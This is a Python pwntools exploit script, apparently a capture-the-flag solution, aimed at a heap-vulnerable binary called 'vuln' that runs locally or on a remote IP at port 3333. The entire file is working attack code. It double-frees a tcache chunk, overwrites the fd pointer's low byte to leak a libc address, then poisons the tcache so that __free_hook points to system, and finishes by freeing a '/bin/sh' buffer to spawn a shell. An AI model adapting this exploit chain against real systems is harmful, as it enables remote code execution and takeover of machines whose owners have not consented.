#!/usr/bin/env python2

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
  script = ""
  PIE = get_base_address(p)
  for bp in breakpoints:
    script += "b *0x%x\n"%(PIE+bp)
  gdb.attach(p,gdbscript=script)

def create(username, age):
    p.sendlineafter(': ', '0')
    p.sendlineafter(': ', str(age))
    p.sendafter(': ', username)

def edit(username, age):
    p.sendlineafter(': ', '1')
    p.sendlineafter(': ', str(age))
    p.sendafter(': ', username)

def free():
    p.sendlineafter(': ', '2')

def message(msg):
    p.sendlineafter(': ', '3')
    p.sendafter(': ', msg)

def start():
    if not args.REMOTE:
        return process('./vuln')
    else:
        return remote('34.69.116.108', 3333)

context.terminal = ['tmux', 'new-window']

p = start()
if args.GDB:
    debug([])

# Initial user
create('A'*8, 15)

# Double free
free()
free()

# Change LSB of fd to 0x80
edit('\x80', 15)

create('A', 15)
message('A'*0x30)

leak = u64(p.recvuntil('Saving').split('\n')[2][-6:].ljust(8, '\x00'))
libc.address = leak - 0x3e82a0
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))

# Tcache poisoning attack
free()
free()

edit(p64(free_hook), 15)
message('/bin/sh\x00')
message(p64(system))
free()

p.interactive()
